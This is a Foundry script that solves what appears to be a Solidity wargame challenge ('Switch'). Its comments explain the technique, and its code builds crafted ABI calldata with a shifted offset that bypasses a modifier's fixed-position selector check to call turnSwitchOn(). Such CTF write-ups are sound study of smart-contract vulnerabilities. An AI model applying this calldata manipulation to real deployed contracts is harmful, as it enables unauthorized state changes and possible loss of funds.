// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Switch} from "../src/Switch.sol";

contract SwitchSolution is Script {
    // $ forge script script/Switch.s.sol --tc SwitchSolution

    function run() external {
        Switch switchInstance = new Switch();

        // - We need to make `swithOn` set to true in order to pass this challenge.
        // - To set it to true we need to call `turnSwitchOn()`, which must be called by the `Switch` contract itself.
        // - To make the contract call itself, we have `flipSwitch(bytes)` function.
        // - This function has a modifier that checks that the data passed in parameters is the signature of the `turnSwitchOff()` function.
        // - It seems that we can't pass `turnSwitchOn()` function signature in the bytes parameter, but the happy thing is that we can :)
        // - We need to understand how `encoding function call` occurs first, and everything will be clear.
        // - To call a function in solidity you need to pass its function signature, which is the first 4 bytes of the keccak256 of the function name.
        // - When making low level call, you don't send these 4 bytes as they are, you are encoding them using `abi.encodeWith*`
        // - What `abi encoding function` does is the following ⬇️
        //    - In [00] slot (first 32 bytes), they are storing the location of the function signature, default (20)
        //    - In [20] slot (second 32 bytes), stored the length of the bytes array
        //    - In [40] slot (second 32 bytes), stores the function encoding call (no params, it will be 4 bytes)
        //
        // - In the `Switch` contract, they are getting the function selector (which is the function to be called), by getting the bytes from [64, 68].
        // - NOTE: The first 32 are for location, the second 32 are for length, and the next 32 stored the signature (first 4 bytes only used).
        //
        // - The issue that this contract has, is that it assumes default encoding all the time.
        // - If we send bytes ourselves, and make the location in another place we can pass this check.
        // - We will set the location to another place [60] slot, and in [40] slot we can put `turnSwitchOff()` signature.
        // - So we will pass the checks as we are providing the signature of the `turnSwitchOff()` in the location the modifier will check-in. The function to be called will retrieved from [60] slot, so we can call any function we want.
        // -
        // - By doing some calculations we will retrieve the correct bytes we need to pass to the `flipSwitch(bytes)` function, to pass the test and call `turnSwitchOn()`.
        //
        // The bytes is calculated below, and we will discuss them in the code...

        bytes4 flipSwitchSelector = switchInstance.flipSwitch.selector;
        bytes4 turnSwitchOnSelector = switchInstance.turnSwitchOn.selector;
        bytes4 turnSwitchOffSelector = switchInstance.turnSwitchOff.selector;

        bytes32 dataLocation = bytes32(uint256(0x60));
        bytes32 zero_32 = 0x0;
        bytes32 turnSwitchOffSelector_32 = bytes32(turnSwitchOffSelector);
        bytes32 dataSize = bytes32(uint256(0x4));
        bytes32 turnSwitchOnSelector_32 = bytes32(turnSwitchOnSelector);

        bytes memory data = bytes.concat(
            flipSwitchSelector, //_______ flipSwitch function selector to call
            dataLocation, //_____________ We will go to slot [60] to get our data
            zero_32, //__________________ used to fill [20] slot position
            turnSwitchOffSelector_32, //_ This is the signature of the `turnSwitchOff()`, to pass the modifier check, and we put it here as the modifier will search for it in this place
            dataSize, //_________________ The size of the data we will call (4 bytes as its single function selecotr). Remember: the location points to the location of the array length first
            turnSwitchOnSelector_32 //___ the function to call which is `turnSwitchOn()` to set switchOn to true
        );

        /*
          cast pretty-calldata <data>:

            Possible methods:
            - flipSwitch(bytes)
            ------------
            [000]: 0000000000000000000000000000000000000000000000000000000000000060 // The location of the data (function call)
            [020]: 0000000000000000000000000000000000000000000000000000000000000000 // filling this place
            [040]: 20606e1500000000000000000000000000000000000000000000000000000000 // modifier will go to bytes [64 -> 68]
                   \______/
                  modifier goes to this => `turnSwitchOff()` signature
            [060]: 0000000000000000000000000000000000000000000000000000000000000004 // The length of the bytes we will call (represents function signature)
            [080]: 76227e1200000000000000000000000000000000000000000000000000000000 // function signature to call `turnSwitchOn()`
                   \______/
                  The function signature to call => `turnSwitchOn()` signature
        */

        console.log("switchOn:", switchInstance.switchOn());
        console.log("-- Attacking --");
        (bool success,) = address(switchInstance).call(data);
        require(success, "failed to switch on");

        console.log("switchOn:", switchInstance.switchOn());
    }
}
